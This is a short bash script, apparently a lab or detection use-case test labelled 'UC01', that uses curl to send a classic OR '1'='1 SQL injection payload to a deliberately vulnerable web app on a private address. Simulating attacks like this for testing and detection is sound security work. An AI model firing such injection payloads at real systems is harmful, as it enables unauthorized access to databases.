#!/bin/bash
echo "[*] UC01: Simulating SQL Injection..."
curl -v "http://172.30.20.10/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit"      -H "Cookie: security=low; PHPSESSID=test"
